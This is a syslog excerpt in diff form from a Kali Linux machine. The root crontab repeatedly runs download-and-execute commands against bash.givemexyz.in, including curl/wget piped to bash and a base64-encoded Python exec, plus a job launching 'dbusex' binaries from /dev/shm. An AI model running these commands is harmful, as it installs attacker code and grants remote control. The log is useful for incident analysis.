@@ -1,0 +1,280 @@
+Nov 23 07:45:08 kali rsyslogd: [origin software="rsyslogd" swVersion="8.2004.0" x-pid="547" x-info="https://www.rsyslog.com"] rsyslogd was HUPed
+Nov 23 07:45:08 kali systemd[1]: logrotate.service: Succeeded.
+Nov 23 07:45:08 kali systemd[1]: Finished Rotate log files.
+Nov 23 07:45:27 kali systemd[1]: man-db.service: Succeeded.
+Nov 23 07:45:27 kali systemd[1]: Finished Daily man-db regeneration.
+Nov 23 07:45:28 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 07:45:28 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 07:45:28 kali CRON[704595]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:45:28 kali CRON[704594]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Nov 23 07:45:28 kali CRON[704600]: (root) CMD (/dev/shm/dbusex -c  && /home/root/dbusex -c  && /var/run/dbusex -c  && /root/dbusex -c )
+Nov 23 07:45:28 kali CRON[704593]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:45:41 kali crontab[704749]: (root) LIST (root)
+Nov 23 07:46:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 07:46:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 07:46:01 kali CRON[704875]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:46:01 kali CRON[704876]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:46:07 kali CRON[704873]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:46:14 kali CRON[649080]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:46:15 kali CRON[704592]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:46:21 kali crontab[705040]: (root) LIST (root)
+Nov 23 07:46:45 kali CRON[704874]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:47:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 07:47:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 07:47:01 kali CRON[705164]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:48:01 kali CRON[705178]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:48:01 kali CRON[705177]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:48:01 kali CRON[705179]: (root) CMD (/dev/shm/dbusex -c  && /home/root/dbusex -c  && /var/run/dbusex -c  && /root/dbusex -c )
+Nov 23 07:48:01 kali CRON[705176]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:48:42 kali crontab[705445]: (root) LIST (root)
+Nov 23 07:48:53 kali CRON[705175]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:49:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 07:49:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 07:49:01 kali CRON[705563]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:49:09 kali crontab[705595]: (root) LIST (root)
+Nov 23 07:49:43 kali crontab[705739]: (root) LIST (root)
+Nov 23 07:50:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 07:50:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 07:50:01 kali CRON[705976]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:50:01 kali CRON[705977]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:50:24 kali CRON[705174]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:50:31 kali CRON[705974]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:50:41 kali CRON[705562]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:50:50 kali CRON[705975]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:51:01 kali CRON[706238]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:51:01 kali CRON[706239]: (root) CMD (/dev/shm/dbusex -c  && /home/root/dbusex -c  && /var/run/dbusex -c  && /root/dbusex -c )
+Nov 23 07:51:01 kali CRON[706237]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:51:35 kali crontab[706389]: (root) LIST (root)
+Nov 23 07:51:43 kali CRON[706236]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:52:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 07:52:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 07:52:01 kali CRON[706509]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:52:01 kali CRON[706508]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:53:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 07:53:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 07:53:01 kali CRON[706646]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:53:05 kali crontab[706667]: (root) LIST (root)
+Nov 23 07:54:01 kali CRON[706895]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:54:01 kali CRON[706893]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:54:01 kali CRON[706894]: (root) CMD (/dev/shm/dbusex -c  && /home/root/dbusex -c  && /var/run/dbusex -c  && /root/dbusex -c )
+Nov 23 07:54:01 kali CRON[706892]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:54:28 kali crontab[707213]: (root) LIST (root)
+Nov 23 07:54:48 kali CRON[706506]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:54:48 kali crontab[707424]: (root) LIST (root)
+Nov 23 07:55:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 07:55:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 07:55:01 kali CRON[707448]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Nov 23 07:55:01 kali CRON[707449]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:55:08 kali rsyslogd: [origin software="rsyslogd" swVersion="8.2004.0" x-pid="547" x-info="https://www.rsyslog.com"] rsyslogd was HUPed
+Nov 23 07:55:12 kali crontab[707470]: (root) LIST (root)
+Nov 23 07:55:25 kali crontab[707504]: (root) LIST (root)
+Nov 23 07:55:26 kali CRON[706645]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:55:57 kali CRON[707447]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:56:00 kali CRON[706890]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:56:00 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 07:56:00 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 07:56:00 kali CRON[707861]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:56:00 kali CRON[707862]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:56:45 kali crontab[708257]: (root) LIST (root)
+Nov 23 07:56:46 kali CRON[707860]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:56:52 kali CRON[705163]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:56:53 kali crontab[708392]: (root) LIST (root)
+Nov 23 07:57:00 kali CRON[707859]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:57:00 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 07:57:00 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 07:57:00 kali CRON[708523]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:57:00 kali CRON[708524]: (root) CMD (/dev/shm/dbusex -c  && /home/root/dbusex -c  && /var/run/dbusex -c  && /root/dbusex -c )
+Nov 23 07:57:00 kali CRON[708522]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:57:21 kali crontab[708545]: (root) LIST (root)
+Nov 23 07:57:25 kali CRON[706891]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:58:01 kali CRON[708771]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:58:01 kali CRON[708772]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:58:50 kali crontab[709048]: (root) LIST (root)
+Nov 23 07:58:56 kali crontab[709081]: (root) LIST (root)
+Nov 23 07:59:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 07:59:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 07:59:01 kali CRON[709103]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 07:59:05 kali crontab[709234]: (root) LIST (root)
+Nov 23 07:59:21 kali CRON[708769]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:59:31 kali CRON[708770]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:59:32 kali CRON[708521]: (CRON) info (No MTA installed, discarding output)
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5746] dhcp4 (eth0): option dhcp_lease_time      => '1800'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5747] dhcp4 (eth0): option domain_name          => 'localdomain'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5747] dhcp4 (eth0): option domain_name_servers  => '192.168.0.2'
+Nov 23 07:59:50 kali dbus-daemon[542]: [system] Activating via systemd: service name='org.freedesktop.nm_dispatcher' unit='dbus-org.freedesktop.nm-dispatcher.service' requested by ':1.2' (uid=0 pid=543 comm="/usr/sbin/NetworkManager --no-daemon ")
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5747] dhcp4 (eth0): option expiry               => '1606138190'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5747] dhcp4 (eth0): option ip_address           => '192.168.0.103'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5747] dhcp4 (eth0): option next_server          => '192.168.0.200'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5747] dhcp4 (eth0): option requested_broadcast_address => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_domain_name => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_domain_name_servers => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_domain_search => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_host_name  => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_interface_mtu => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_ms_classless_static_routes => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_nis_domain => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_nis_servers => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_ntp_servers => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_rfc3442_classless_static_routes => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_root_path  => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_routers    => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_static_routes => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5748] dhcp4 (eth0): option requested_subnet_mask => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5749] dhcp4 (eth0): option requested_time_offset => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5749] dhcp4 (eth0): option requested_wpad       => '1'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5749] dhcp4 (eth0): option routers              => '192.168.0.2'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5749] dhcp4 (eth0): option subnet_mask          => '255.255.255.0'
+Nov 23 07:59:50 kali NetworkManager[543]: <info>  [1606136390.5749] dhcp4 (eth0): state changed bound -> extended
+Nov 23 07:59:50 kali systemd[1]: Starting Network Manager Script Dispatcher Service...
+Nov 23 07:59:50 kali dbus-daemon[542]: [system] Successfully activated service 'org.freedesktop.nm_dispatcher'
+Nov 23 07:59:50 kali systemd[1]: Started Network Manager Script Dispatcher Service.
+Nov 23 07:59:51 kali crontab[709614]: (root) LIST (root)
+Nov 23 08:00:01 kali systemd[1]: NetworkManager-dispatcher.service: Succeeded.
+Nov 23 08:00:01 kali cron[541]: (*system*nginx) RELOAD (/etc/cron.d/nginx)
+Nov 23 08:00:01 kali cron[541]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)
+Nov 23 08:00:01 kali CRON[709625]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 08:00:01 kali CRON[709626]: (root) CMD ((curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms)
+Nov 23 08:00:01 kali CRON[709627]: (root) CMD (/dev/shm/dbusex -c  && /home/root/dbusex -c  && /var/run/dbusex -c  && /root/dbusex -c )
+Nov 23 08:00:01 kali CRON[709624]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:00:02 kali CRON[709623]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:00:12 kali CRON[709622]: (CRON) info (No MTA installed, discarding output)
+Nov 23 08:00:23 kali dbus-daemon[810]: [session uid=0 pid=810] Activating service name='org.freedesktop.thumbnails.Cache1' requested by ':1.21' (uid=0 pid=917 comm="Thunar --daemon ")
+Nov 23 08:00:25 kali org.freedesktop.thumbnails.Cache1[709654]: Registered thumbnailer /usr/bin/gdk-pixbuf-thumbnailer -s %s %u %o
+Nov 23 08:00:25 kali org.freedesktop.thumbnails.Cache1[709654]: Registered thumbnailer /usr/bin/gdk-pixbuf-thumbnailer -s %s %u %o
+Nov 23 08:00:26 kali org.freedesktop.thumbnails.Cache1[709654]: Registered thumbnailer atril-thumbnailer -s %s %u %o
+Nov 23 08:00:27 kali lightdm[709661]: Error getting user list from org.freedesktop.Accounts: GDBus.Error:org.freedesktop.DBus.Error.ServiceUnknown: The name org.freedesktop.Accounts was not provided by any .service files
+Nov 23 08:00:27 kali systemd[1]: Created slice User Slice of UID 129.
+Nov 23 08:00:27 kali systemd[1]: Starting User Runtime Directory /run/user/129...
+Nov 23 08:00:27 kali systemd[1]: Finished User Runtime Directory /run/user/129.
+Nov 23 08:00:27 kali systemd[1]: Starting User Manager for UID 129...
+Nov 23 08:00:27 kali dbus-daemon[810]: [session uid=0 pid=810] Successfully activated service 'org.freedesktop.thumbnails.Cache1'
+Nov 23 08:00:27 kali systemd[709676]: gpgconf: error running '/usr/lib/gnupg/scdaemon': probably not installed
+Nov 23 08:00:28 kali systemd[709665]: Reached target Paths.
+Nov 23 08:00:28 kali systemd[709665]: Reached target Timers.
+Nov 23 08:00:28 kali systemd[709665]: Starting D-Bus User Message Bus Socket.
+Nov 23 08:00:28 kali systemd[709665]: Listening on GnuPG network certificate management daemon.
+Nov 23 08:00:28 kali systemd[709665]: Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Nov 23 08:00:28 kali systemd[709665]: Listening on GnuPG cryptographic agent and passphrase cache (restricted).
+Nov 23 08:00:28 kali systemd[709665]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
+Nov 23 08:00:28 kali systemd[709665]: Listening on GnuPG cryptographic agent and passphrase cache.
+Nov 23 08:00:28 kali systemd[709665]: Listening on debconf communication socket.
+Nov 23 08:00:28 kali systemd[709665]: Listening on Sound System.
+Nov 23 08:00:28 kali systemd[709665]: Listening on D-Bus User Message Bus Socket.
+Nov 23 08:00:28 kali systemd[709665]: Reached target Sockets.
+Nov 23 08:00:28 kali systemd[709665]: Reached target Basic System.
+Nov 23 08:00:28 kali systemd[1]: Started User Manager for UID 129.
+Nov 23 08:00:28 kali systemd[1]: Started Session c8 of user lightdm.
+Nov 23 08:00:28 kali systemd[709665]: Starting Sound Service...
+Nov 23 08:00:28 kali rtkit-daemon[736]: Successfully made thread 709690 of process 709690 owned by '129' high priority at nice level -11.
+Nov 23 08:00:28 kali rtkit-daemon[736]: Supervising 1 threads of 1 processes of 1 users.
+Nov 23 08:00:28 kali systemd[709665]: Started D-Bus User Message Bus.
+Nov 23 08:00:29 kali dbus-daemon[709693]: [session uid=129 pid=709693] Activating via systemd: service name='org.a11y.Bus' unit='at-spi-dbus-bus.service' requested by ':1.2' (uid=129 pid=709691 comm="/usr/sbin/lightdm-gtk-greeter ")
+Nov 23 08:00:29 kali systemd[709665]: Starting Accessibility services bus...
+Nov 23 08:00:29 kali dbus-daemon[709693]: [session uid=129 pid=709693] Successfully activated service 'org.a11y.Bus'
+Nov 23 08:00:29 kali systemd[709665]: Started Accessibility services bus.
+Nov 23 08:00:29 kali dbus-daemon[709693]: [session uid=129 pid=709693] Activating via systemd: service name='org.gtk.vfs.Daemon' unit='gvfs-daemon.service' requested by ':1.4' (uid=129 pid=709691 comm="/usr/sbin/lightdm-gtk-greeter ")
+Nov 23 08:00:29 kali systemd[709665]: Starting Virtual filesystem service...
+Nov 23 08:00:30 kali dbus-daemon[709693]: [session uid=129 pid=709693] Successfully activated service 'org.gtk.vfs.Daemon'
+Nov 23 08:00:30 kali systemd[709665]: Started Virtual filesystem service.
+Nov 23 08:00:30 kali pulseaudio[709690]: N: [pulseaudio] alsa-util.c: Disabling timer-based scheduling because running inside a VM.
+Nov 23 08:00:30 kali rtkit-daemon[736]: Supervising 1 threads of 1 processes of 1 users.
+Nov 23 08:00:30 kali rtkit-daemon[736]: Successfully made thread 709708 of process 709690 owned by '129' RT at priority 5.
+Nov 23 08:00:30 kali rtkit-daemon[736]: Supervising 2 threads of 1 processes of 1 users.
+Nov 23 08:00:30 kali pulseaudio[709690]: N: [pulseaudio] alsa-util.c: Disabling timer-based scheduling because running inside a VM.
+Nov 23 08:00:30 kali pulseaudio[709690]: E: [alsa-sink-ES1371/1] alsa-sink.c: ALSA woke us up to write new data to the device, but there was actually nothing to write.
+Nov 23 08:00:30 kali pulseaudio[709690]: E: [alsa-sink-ES1371/1] alsa-sink.c: Most likely this is a bug in the ALSA driver 'snd_ens1371'. Please report this issue to the ALSA developers.
+Nov 23 08:00:30 kali pulseaudio[709690]: E: [alsa-sink-ES1371/1] alsa-sink.c: We were woken up with POLLOUT set -- however a subsequent snd_pcm_avail() returned 0 or another value < min_avail.
+Nov 23 08:00:30 kali rtkit-daemon[736]: Supervising 2 threads of 1 processes of 1 users.
+Nov 23 08:00:30 kali rtkit-daemon[736]: Successfully made thread 709709 of process 709690 owned by '129' RT at priority 5.
+Nov 23 08:00:30 kali rtkit-daemon[736]: Supervising 3 threads of 1 processes of 1 users.
+Nov 23 08:00:30 kali pulseaudio[709690]: E: [alsa-source-ES1371/1] alsa-source.c: ALSA woke us up to read new data from the device, but there was actually nothing to read.
+Nov 23 08:00:30 kali pulseaudio[709690]: E: [alsa-source-ES1371/1] alsa-source.c: Most likely this is a bug in the ALSA driver 'snd_ens1371'. Please report this issue to the ALSA developers.
